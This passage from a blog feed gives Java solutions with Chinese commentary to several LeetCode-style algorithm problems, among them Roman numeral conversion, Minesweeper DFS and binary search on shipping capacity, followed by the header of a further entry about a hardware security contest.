class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(x != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// 先判断倒序数字是否满足条件</span></span><br><span class="line">            <span class="keyword">if</span>(ret&gt;Integer.MAX_VALUE/<span class="number">10</span> || (ret==Integer.MAX_VALUE/<span class="number">10</span> &amp;&amp; x&gt;<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(ret&lt;Integer.MIN_VALUE/<span class="number">10</span> || (ret==Integer.MIN_VALUE/<span class="number">10</span> &amp;&amp; x&lt;-<span class="number">8</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ret = ret*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x /= <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="isPalindrome"><a href="#isPalindrome" class="headerlink" title="isPalindrome"></a>isPalindrome</h2><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210413003108936.png" style="zoom:80%;" /><p>这道题和上面将数字倒序的思想是一样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">     <span class="comment">// 判断负数</span></span><br><span class="line">     <span class="keyword">if</span>(x&lt;<span class="number">0</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">int</span> temp = x, cmpNum=<span class="number">0</span>;</span><br><span class="line">         <span class="keyword">while</span> (temp != <span class="number">0</span>)&#123;</span><br><span class="line">             cmpNum = cmpNum*<span class="number">10</span> + temp%<span class="number">10</span>;</span><br><span class="line">             temp /= <span class="number">10</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span>(cmpNum==x)&#123;</span><br><span class="line">             <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span>  <span class="keyword">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210413003236573.png"></p><h2 id="romanToInt"><a href="#romanToInt" class="headerlink" title="romanToInt"></a>romanToInt</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210413214054861.png"></p><p>这道题也可以用打表的思路，将不能单个字符表示的罗马数字全部穷举出来，这里只有6组，然后上哈希表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4, 9, 40, 90, 400, 900</span><br><span class="line">IV IX XL  XC  CD   CM</span><br></pre></td></tr></table></figure><p>从右到左来切割判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        String[] strArr = &#123;<span class="string">&quot;I&quot;</span>,<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;V&quot;</span>,<span class="string">&quot;IX&quot;</span>,<span class="string">&quot;X&quot;</span>,<span class="string">&quot;XL&quot;</span>,<span class="string">&quot;L&quot;</span>,<span class="string">&quot;XC&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;CD&quot;</span>,<span class="string">&quot;D&quot;</span>,<span class="string">&quot;CM&quot;</span>,<span class="string">&quot;M&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] num = &#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">90</span>,<span class="number">100</span>,<span class="number">400</span>,<span class="number">500</span>,<span class="number">900</span>,<span class="number">1000</span>&#125;;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; strArr.length; i++) &#123;</span><br><span class="line">            map.put(strArr[i],num[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length();) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i+<span class="number">2</span>&lt;=s.length() &amp;&amp; (map.containsKey(s.substring(i,i+<span class="number">2</span>))))&#123;</span><br><span class="line">                ret += map.get(s.substring(i,i+<span class="number">2</span>));</span><br><span class="line">                i += <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ret += map.get(s.substring(i,i+<span class="number">1</span>));</span><br><span class="line">            i += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="largestNumber"><a href="#largestNumber" class="headerlink" title="largestNumber"></a>largestNumber</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210413213455765.png"></p><p>这道题折磨了一天，需要用到别人感觉并不复杂但是我看不懂的数学证明，所以数学证明是不可能证明的，用字符串解决</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">largestNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span></span>&#123;</span><br><span class="line">        <span class="comment">/// 不能用顺序排列</span></span><br><span class="line">    <span class="comment">/// 数字排序和字符串排序思路都不同</span></span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        String[] numStr = <span class="keyword">new</span> String[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            numStr[i] = String.valueOf(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/// compareTo返回前字符串比较字符ASCII与后字符串比较字母ASCII的差值</span></span><br><span class="line">        Arrays.sort(numStr,(a, b)-&gt;&#123;     <span class="comment">// 使用lambda重写sort函数，使其字符串逆序排序</span></span><br><span class="line">            <span class="keyword">return</span> (b+a).compareTo(a+b); <span class="comment">// 如果后面加起来比前面大的话，返回1</span></span><br><span class="line">                                         <span class="comment">// 否则返回0</span></span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(Arrays.toString(numStr));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(numStr[<span class="number">0</span>].equals(<span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuilder ret = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numStr.length; i++) &#123;</span><br><span class="line">            ret.append(numStr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="黑白方格画"><a href="#黑白方格画" class="headerlink" title="黑白方格画"></a>黑白方格画</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210421164744748.png"></p><p>一道纯考排列组合的数学题，两年没有碰过这些考智商的东西，脑袋没转过弯来，虽然里面包含的数学知识也不是很复杂，</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426222142215.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426222211918.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(a == <span class="number">1</span> || a == <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">return</span> factorial(a-<span class="number">1</span>)*a;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">combine</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">       <span class="keyword">return</span> factorial(n)/(factorial(a)*factorial(n-a));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">paintingPlan</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (n*n == k)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">       &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n &gt; k)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> a=<span class="number">0</span>; a&lt;=n; a++)&#123;</span><br><span class="line">           <span class="keyword">for</span>(<span class="keyword">int</span> b=<span class="number">0</span>; b&lt;=n; b++)&#123;</span><br><span class="line">               <span class="keyword">if</span>(k == n*(a+b)-a*b)&#123;</span><br><span class="line">                   ret += combine(n, a)*combine(n, b);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> ret;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="跳水板-amp-amp-青蛙跳台阶"><a href="#跳水板-amp-amp-青蛙跳台阶" class="headerlink" title="跳水板 &amp;&amp; 青蛙跳台阶"></a>跳水板 &amp;&amp; 青蛙跳台阶</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210421194225407.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210423194542590.png"></p><p>这道题如果用纯递归的方法去做属实不行，时间复杂度太高了<code>&lt;O(2^n)&gt;</code>，斐波那契数列的性质是一样的，前面两个数决定后一个数，动态规划</p><ul><li>递归方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">divingBoard</span><span class="params">(<span class="keyword">int</span> shorter, <span class="keyword">int</span> longer, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; <span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">0</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> climb(shorter, longer, k - <span class="number">1</span>) + climb(shorter, longer, k - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>非递归方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] divingBoard(<span class="keyword">int</span> shorter, <span class="keyword">int</span> longer, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span>(k == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shorter == longer)&#123;</span><br><span class="line">            <span class="keyword">int</span>[] ret = &#123;shorter * k&#125;;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] board = <span class="keyword">new</span> <span class="keyword">int</span>[k + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> shortest = k * shorter;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            board[i] = shortest + i * (longer - shorter);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> board;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="重要的员工"><a href="#重要的员工" class="headerlink" title="重要的员工"></a>重要的员工</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210425111336020.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">retSubImp</span><span class="params">(Employee pre, List&lt;Employee&gt; employees)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pre.subordinates.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> imp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer sub :</span><br><span class="line">                pre.subordinates) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Employee employee :</span><br><span class="line">                   employees ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (sub == employee.id)&#123;</span><br><span class="line">                    imp += employee.importance;</span><br><span class="line">                    imp += retSubImp(employee, employees);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> imp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getImportance</span><span class="params">(List&lt;Employee&gt; employees, <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> imp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Employee staff :</span><br><span class="line">                employees) &#123;</span><br><span class="line">            <span class="keyword">if</span> (staff.id == id)&#123;</span><br><span class="line">                imp += staff.importance;</span><br><span class="line">                <span class="keyword">for</span> (Integer subid :</span><br><span class="line">                        staff.subordinates) &#123;</span><br><span class="line">                    imp += retSubImp(staff, employees);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> imp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="扫雷"><a href="#扫雷" class="headerlink" title="扫雷"></a>扫雷</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426190824816.png"></p><p>这道题有点好玩😛，dfs搜索一共三个步骤</p><ul><li>判断该坐标是否为雷，如果是雷就直接结束游戏</li><li>如果不是雷，判断坐标周围雷的个数，如果个数不为0，则标记雷的个数，结束游戏</li><li>如果周围没有雷，则递归检索周围没有越界的坐标</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> width;</span><br><span class="line"><span class="keyword">int</span> height;</span><br><span class="line"><span class="keyword">int</span> countBomb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;,</span><br><span class="line">                &#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, -<span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">char</span>[] dic = &#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateBoardDfs</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span>[][] sign)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= height || x &lt; <span class="number">0</span> || y &gt;= width || y &lt; <span class="number">0</span> || sign[x][y] == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 首先判断周围8个方向是否有雷</span></span><br><span class="line">    getCountBomb(board, x, y);</span><br><span class="line">    <span class="keyword">if</span> (countBomb != <span class="number">0</span>)&#123;</span><br><span class="line">        board[x][y] = dic[countBomb];</span><br><span class="line">        countBomb = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 八个方向</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> post_x = x + step[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> post_y = y + step[i][<span class="number">1</span>];</span><br><span class="line">        board[x][y] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">        sign[x][y] = <span class="number">1</span>;</span><br><span class="line">        updateBoardDfs(board, post_x, post_y, sign);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCountBomb</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> post_x = x + step[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> post_y = y + step[i][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (post_x &gt;= height || post_x &lt; <span class="number">0</span> || post_y &gt;= width || post_y &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (board[post_x][post_y] == <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">            countBomb++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 判断点击是否为雷</span></span><br><span class="line"><span class="comment"> * 检索周围8个方向是否有雷，无雷标记为B</span></span><br><span class="line"><span class="comment"> * 有雷标检索有雷个数，然后标记数字</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">char</span>[][] updateBoard(<span class="keyword">char</span>[][] board, <span class="keyword">int</span>[] click)&#123;</span><br><span class="line">    width = board[<span class="number">0</span>].length;</span><br><span class="line">    height = board.length;</span><br><span class="line">    <span class="keyword">int</span>[][] sign = <span class="keyword">new</span> <span class="keyword">int</span>[height][width];</span><br><span class="line">    <span class="comment">// 玩家点击矩阵坐标</span></span><br><span class="line">    <span class="keyword">char</span> playerClickPot = board[click[<span class="number">0</span>]][click[<span class="number">1</span>]];</span><br><span class="line">    <span class="keyword">if</span> (playerClickPot == <span class="string">&#x27;M&#x27;</span>)&#123;</span><br><span class="line">        board[click[<span class="number">0</span>]][click[<span class="number">1</span>]] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        updateBoardDfs(board, click[<span class="number">0</span>], click[<span class="number">1</span>],  sign);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> board;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在D天内送达包裹的能力"><a href="#在D天内送达包裹的能力" class="headerlink" title="在D天内送达包裹的能力"></a>在D天内送达包裹的能力</h2><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426220019030.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426220051541.png"></p><p>看题解打卡下班</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">shipWithinDays</span><span class="params">(<span class="keyword">int</span>[] weights, <span class="keyword">int</span> D)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = Arrays.stream(weights).max().getAsInt();</span><br><span class="line">        <span class="keyword">int</span> right = Arrays.stream(weights).sum();</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">            <span class="keyword">int</span> middle = (left+right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> needDay = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> goodWeight : weights)&#123;</span><br><span class="line">                <span class="keyword">if</span> (sum + goodWeight &gt; middle)&#123;</span><br><span class="line">                    needDay++;</span><br><span class="line">                    sum = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sum += goodWeight;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (needDay &lt;= D)&#123;</span><br><span class="line">                right = middle;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = middle + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h2 id=&quot;towsum&quot;&gt;&lt;a href=&quot;#towsum&quot; class=&quot;headerlink&quot; title=&quot;towsum&quot;&gt;&lt;/a&gt;towsum&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://f1sh-blog.o</summary>
      
    
    
    
    
    <category term="leetcode" scheme="http://example.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>HWS计划2021硬件安全冬令营线上选拔赛</title>
    <link href="http://example.com/23409/"/>
    <id>http://example.com/23409/</id>
    <published>2021-07-14T04:44:17.040Z</published>
    <updated>2022-01-01T09:53:51.752Z</updated>
    
